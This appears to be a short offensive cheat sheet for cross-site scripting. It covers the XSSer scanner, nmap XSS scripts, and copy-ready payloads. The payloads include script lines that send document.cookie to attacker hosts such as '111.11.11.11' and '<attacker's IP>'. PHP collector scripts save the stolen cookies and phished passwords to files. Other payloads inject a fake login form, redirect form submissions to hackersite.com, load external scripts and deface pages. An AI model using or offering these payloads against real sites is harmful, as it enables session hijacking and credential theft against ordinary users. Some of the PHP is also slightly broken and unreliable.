XSSer

xsser -c100 --Cw=4 -U <target-host>
c : number of pages to crawl
--Cw : depth of crawler 
-u : URL




### Simple injection from URL:

-u "http://host.com"



### XSS Examples

Simple Alert Box

<script>alert('attacked')</script>

### Cookie Stealing

Example one

<script>document.location="http://localhost/cookie.php?q="+document.cookie;</script>

Example two

<a href="javascript:document.location='http://localhost/cookie.php?q='+document.cookie;">CLICK ME!</a>

cookie.php could look like this:

<?php
$file = "cookie.txt"
$act = fopen($file, 'a');
$cookie = $_GET['q'];
fwrite($act,$cookie);
fclose($act);
?>

Other examples

<script>new image().src="http://<attacker's IP Address>/b.php?"+document.cookie;</script>
<script>new Image().src="http://111.11.11.11/"+encodeURI(document.cookie)</script>
<script>$.post("http://111.11.11.11", {cookie:document.cookie})</script>

Phishing

Example one

<form name ="phish" action="http://localhost/phish.php" method="post">
<br><br><hr>
<h3>Login now:</h3><br><br>
Enter Username: <br><input type="text" name="email"><br><Enter Password:<br><input type="password" name="pass"><br> 
<input type="submit" name="Login" value="Login">
</form>
<br><br><hr>

phish.php could look like this:

<?php
$file = fopen('phished.txt', 'a');
$fwrite($file, 'Email = ' . $_POST['email'] . PHP_EOL);
$fwrite($file, 'Pass = ' . $_POST['pass'] . PHP_EOL . PHP_EOL);
fclose($file);
header("Location: http://exapmle.com/xss.html");
die();
?>

Example two

In this case, the page will remain completely unchanged. SSL will not help the victim either.

Forms[0].action.value="http://hackersite.com/phish.cgi";

Stored XSS -> Image onmouseover

<IMG SRC=# onmouseover="alert(document.cookie)">

Call a script from an external source

<script>document.write('<script src=http://example.com/xss.js></script>')</script>

Post data to form

<script>$.post("<http form>", {parameter: "<value>"})</script>

DOM Deface

# deface with image
document.body.innerHTML="<img src="#" height="500%" width="700%" ></img>";

Tool scanning for XSS vulnerabilities
ARACHNI: https://www.arachni-scanner.com/
NMAP: (NSE scripts: http-dombased-xss , http-stored-xss , http-phpself-xss)

nmap -p80 --script http-stored-xss.nse --script-args=httpspider,maxpagecount=200 <target-host>
